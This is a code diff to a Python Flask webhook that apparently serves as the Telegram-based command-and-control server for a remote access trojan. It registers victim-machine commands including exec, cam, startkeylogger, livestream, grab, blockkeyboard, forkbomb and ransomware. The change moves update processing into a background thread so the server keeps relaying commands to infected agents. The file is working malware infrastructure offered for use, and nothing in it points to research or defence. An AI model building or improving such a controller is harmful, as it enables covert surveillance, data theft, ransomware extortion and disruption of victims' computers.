@@ -6,6 +6,7 @@ import httpx
 import asyncio
 import traceback
 import time
+import threading
 from flask import Flask, request
 
 from telegram import Update
@@ -157,30 +158,33 @@ async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_
 
 # --- Register handlers ---
 ptb_app.add_handler(CommandHandler("help", cmd_help))
-# (Other handlers like list, target, destroy remain the same)
 agent_commands = [
     "info", "exec", "ss", "cam", "startkeylogger", "stopkeylogger", 
     "livestream", "stoplivestream", "grab", "ls", "cd", "download",
     "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse",
     "forkbomb", "cancelforkbomb", "ransomware", "restore",
-    # --- NEW COMMANDS REGISTERED ---
     "tts", "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen"
 ]
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
 # --- Main Webhook Endpoint ---
+async def process_update_async(update_data):
+    try:
+        await ptb_app.initialize()
+        update = Update.de_json(update_data, ptb_app.bot)
+        await ptb_app.process_update(update)
+        await ptb_app.shutdown()
+    except Exception as e:
+        print(f"Error processing update: {e}")
+        traceback.print_exc()
+
 @app.route('/', methods=['POST'])
-async def process_webhook():
+def process_webhook():
     if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
         return 'Unauthorized', 403
-    
-    update_data = await request.get_json()
-    await ptb_app.initialize()
-    update = Update.de_json(update_data, ptb_app.bot)
-    await ptb_app.process_update(update)
-    await ptb_app.shutdown()
-    
+    update_data = request.get_json(force=True)
+    threading.Thread(target=lambda: asyncio.run(process_update_async(update_data))).start()
     return 'OK', 200
 
 @app.route('/', methods=['GET'])
